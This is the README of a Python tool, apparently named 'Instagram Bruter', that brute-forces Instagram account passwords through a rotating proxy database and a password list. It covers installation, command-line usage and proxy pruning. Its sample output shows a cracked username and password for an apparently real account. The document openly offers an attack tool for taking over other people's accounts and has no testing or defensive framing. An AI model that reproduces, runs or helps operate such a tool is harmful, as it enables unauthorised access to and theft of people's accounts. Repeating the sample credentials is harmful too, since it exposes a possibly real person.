# Instagram Bruter


This program will brute force any Instagram account you send it its way given a list of proxies.

### NOTICE



It motivates me to keep updating this program.


> **PayPal:** shobhitstthakur105@gmail.com

## Requirements

- Python _v3.9_
- proxy list

## Install Dependencies

### Install Pipenv

```
pip install pipenv
```

### Create environment

Make sure you have Python 3.9 installed

```
pipenv --python 3.9
```

### Install Requirements

```
pipenv install
```

## Help

```
usage: instagram.py [-h] [-u USERNAME] [-p PASSLIST] [-px PROXYLIST] [--prune PRUNE] [--stats] [-nc] [-m MODE]

optional arguments:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        email or username
  -p PASSLIST, --passlist PASSLIST
                        password list
  -px PROXYLIST, --proxylist PROXYLIST
                        proxy list
  --prune PRUNE         prune the database
  --stats               get statistics of the proxies
  -nc, --no-color       disable colors
  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
```

## Proxies

The system needs a list of proxies to work. Once uploaded, proxies are saved into a database.<br/>

### Upload

Upload a list of proxies into the program. The proxy file must have a format of `ip:port`<br/>

`proxies_list.txt`

```
3.238.111.248:80
206.189.59.192:8118
165.22.81.30:34100
176.248.120.70:3128
191.242.178.209:3128
180.92.194.235:80
```

To upload a list of proxies a similar syntax must be followed.

```
python instagram.py -px <path to proxy list>
```

### Stats

This gives an insight into the health of the proxies in the database.

```
python instagram.py --stats
```

### Prune

This allows the able to get rid of proxies with a score below a given score.<br/>
It is recommended that you run the `--stats` and prune the database of proxies<br/>
who have a proxy score below `Q1`.

```
python instagram.py --prune 0.05
```

Pruning is not a requirement because the <br/>
the system will automatically learn which proxies perform poorly and stop using them.

### Usage

```
python instagram.py -u <username> -p <passlist>
```

### Run

```
[-] Wordlist: passlist.txt
[-] Username: Sami09.1
[-] Password: 272
[-] Complete: 45.51%
[-] Attempts: 228
[-] Browsers: 273
[-] Exists: True
```

### Stop

```
[-] Wordlist: passlist.txt
[-] Username: Sami09.1
[-] Password: Sami123
[-] Complete: 62.67%
[-] Attempts: 314
[-] Browsers: 185
[-] Exists: True

[!] Password Found
[+] Username: Sami09.1
[+] Password: Sami123
```
